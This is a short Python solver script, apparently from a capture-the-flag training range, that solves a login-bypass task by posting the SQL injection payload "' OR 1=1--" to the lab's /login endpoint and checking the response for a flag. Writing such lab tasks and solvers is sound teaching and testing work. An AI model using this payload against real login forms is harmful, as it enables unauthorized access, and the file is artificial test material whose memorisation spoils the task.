"""Intended-path solver: SQL injection login bypass."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

PAYLOAD = {"username": "' OR 1=1--", "password": "irrelevant"}


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.post(f"{ctx.url()}/login", data=PAYLOAD, timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="login-bypass",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag in response",
            )
        ]
    )
